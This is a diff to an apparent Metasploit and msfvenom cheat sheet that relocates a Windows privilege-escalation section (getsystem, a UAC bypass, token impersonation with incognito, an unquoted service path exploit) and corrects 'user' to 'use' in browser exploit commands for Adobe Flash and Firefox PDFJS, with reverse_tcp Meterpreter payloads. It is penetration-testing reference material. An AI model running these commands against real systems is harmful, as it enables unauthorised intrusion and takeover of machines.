@@ -159,57 +159,6 @@ set SESSION <Session #>
 run
 ```
 
-### Escalate Privileges
-#### Linux PrivEsc
-##### [Get System Information](#Get-System-Information-of-Exploited-Target)
-#### Windows PrivEsc
-##### [Get System Information](#Get-System-Information-of-Exploited-Target)
-##### Escalate Privileges with GetSystem
-```bash
-# Only works with Windows
-getsystem
-
-# 0: All techniques available
-# 1: Named Pipe Impersonation (In Memory/Admin)
-# 2: Named Pipe Impersonation (Dropper/Admin)
-# 3: Token Duplication (In Memory/Admin)
-# 4: Named Pipe Impersonation (RPCSS variant)
-```
-##### Windows Gather Privileges Enumeration
-```bash
-use post/windows/gather/win_privs
-set SESSION <Session #>
-run
-```
-##### Escalate Privileges Under UAC
-```bash
-# Determine if UAC is enabled, if so, getsystem will fail
-use post/windows/gather/win_privs
-set SESSION <Session #>
-run
-
-# If UAC is enabled
-search bypassuac
-use
-set SESSION <Session #>
-exploit
-
-getsystem
-```
-##### Escalate with Incognito
-```bash
-# From Meterpreter shell
-use incognito
-list_tokens -u
-impersonate_token <Token Name> # Escape \'s.
-```
-##### Exploit Unquoted Service Paths
-```bash
-use exploit/windows/local/unquoted_service_path
-set SESSION <Session #>
-exploit
-```
-
 # msfvenom
 ### Framework Encoders [--encoder ]
 ```bash
@@ -432,7 +381,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LHOST=<Port #
 ##### UAF
 ```bash
 msfconsole -q
-user exploit/multi/browser/adobe_flash_hacking_team_uaf
+use exploit/multi/browser/adobe_flash_hacking_team_uaf
 show options
 set LHOST <Attack Machine>
 
@@ -452,7 +401,7 @@ exploit
 ##### PDFJS
 ```bash
 msfconsole -q
-user exploit/multi/browser/firefox_pdfjs_privilege_escalation
+use exploit/multi/browser/firefox_pdfjs_privilege_escalation
 show options
 
 show targets
@@ -563,6 +512,57 @@ set TARGET <Target #>
 show payloads
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+# Escalate Privileges
+### Linux PrivEsc
+##### [Get System Information](#Get-System-Information-of-Exploited-Target)
+### Windows PrivEsc
+##### [Get System Information](#Get-System-Information-of-Exploited-Target)
+##### Escalate Privileges with GetSystem
+```bash
+# Only works with Windows
+getsystem
+
+# 0: All techniques available
+# 1: Named Pipe Impersonation (In Memory/Admin)
+# 2: Named Pipe Impersonation (Dropper/Admin)
+# 3: Token Duplication (In Memory/Admin)
+# 4: Named Pipe Impersonation (RPCSS variant)
+```
+##### Windows Gather Privileges Enumeration
+```bash
+use post/windows/gather/win_privs
+set SESSION <Session #>
+run
+```
+##### Escalate Privileges Under UAC
+```bash
+# Determine if UAC is enabled, if so, getsystem will fail
+use post/windows/gather/win_privs
+set SESSION <Session #>
+run
+
+# If UAC is enabled
+search bypassuac
+use
+set SESSION <Session #>
+exploit
+
+getsystem
+```
+##### Escalate with Incognito
+```bash
+# From Meterpreter shell
+use incognito
+list_tokens -u
+impersonate_token <Token Name> # Escape \'s.
+```
+##### Exploit Unquoted Service Paths
+```bash
+use exploit/windows/local/unquoted_service_path
+set SESSION <Session #>
+exploit
 ```
 
 # Cheatsheets
